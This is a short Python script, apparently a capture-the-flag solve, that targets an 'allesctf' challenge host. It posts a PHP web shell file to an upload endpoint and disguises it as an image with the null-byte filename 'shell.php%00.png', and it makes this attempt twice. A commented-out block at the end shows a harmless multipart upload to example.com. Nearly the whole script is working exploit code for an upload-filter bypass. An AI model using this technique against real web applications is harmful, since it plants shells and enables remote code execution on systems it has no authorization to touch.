import requests
r=requests.post('http://lfi.hax1.allesctf.net:8081/index.php?site=upload.php', files={'file': ('shell.php%00.png',open('shell2.php', 'rb').read(), 'image/png')})
print(r.text)

exit()

import requests
fname='shell.php%00.png'
url="http://lfi.hax1.allesctf.net:8081/index.php?site=upload.php"
files = {'file': (fname, open('shell.php', 'r').read())}
data={'Content-Type': 'image/png'}
#print(files)
#r = requests.post(url, files=files)
#r=requests.post(url,files=files,data=data)
r=requests.post('http://lfi.hax1.allesctf.net:8081/index.php?site=upload.php', files={'file': (fname,open('shell.php', 'r').read(), 'image/png')})
print(r.text)

exit()

'''
import requests
import os
 

def send_data_to_server(image_path, temperature):
         
    image_filename = os.path.basename(image_path)
 
    multipart_form_data = {
        'image': (image_filename, open(image_path, 'rb')),
        'temperature': ('', str(temperature)),
    }
 
    response = requests.post('http://www.example.com/api/v1/sensor_data/',
                             files=multipart_form_data)
 
    print(response.status_code)
'''